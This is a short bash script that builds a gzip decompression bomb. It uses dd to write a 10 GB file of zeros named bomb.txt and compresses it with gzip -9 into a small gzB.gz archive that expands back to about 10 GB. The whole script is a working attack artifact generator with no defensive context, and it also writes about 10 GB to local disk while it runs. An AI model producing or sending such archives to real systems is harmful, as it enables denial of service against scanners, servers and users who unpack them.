#!/bin/bash

mkdir gz 
cd gz 
echo "Starting.. "
dd if=/dev/zero of=bomb.txt bs=10M count=1024 
echo "Files created"
cat bomb.txt >> gzB

echo "Starting compression.."
gzip -9 gzB 

echo "End"
mv gzB.gz ../
cd .. 
rm -rf gz
